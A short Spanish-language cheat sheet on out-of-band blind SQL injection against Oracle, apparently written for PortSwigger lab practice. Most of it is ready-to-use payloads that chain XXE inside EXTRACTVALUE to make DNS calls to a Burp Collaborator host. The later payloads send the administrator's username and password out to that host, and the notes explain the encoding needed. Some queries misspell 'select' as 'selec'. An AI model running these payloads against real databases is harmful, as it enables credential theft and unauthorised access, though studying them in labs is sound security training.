# Inyección SQL Blind fuera de banda (OOB)

Tags: #SQLI #Oracle  #BurpSuite 

* [SQLi Cheat Sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

```mysql 
❯ ' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual -- -
	
	# ; = %3b 
	# % = %25

Notas:
	1. Urlencodear los caracteres de arriba para que no entre en conflicto 
	2. Usar BurpSuite Pro para obtener la url que da el 'COLLABORATOR-SUBDOMAIN'
	3. El ataque se efectua por utilizar la vulnerabilidad de XXE para hacer consultas DNS
```

## Extraer datos 

```mysql 
# Se puede colocar una query, un punto y despues la url del 'BURP-COLLABORATOR-SUBDOMAIN', las respuesta se ven en la misma pestaña del 'Colaborator' al momento de hacer 'Pull now'
❯ ' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(selec username from users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual -- -

	# ; = %3b 
	# % = %25
```

### Conocer la password 

```mysql 
❯ ' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(selec password from users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual -- -

	# ; = %3b 
	# % = %25
```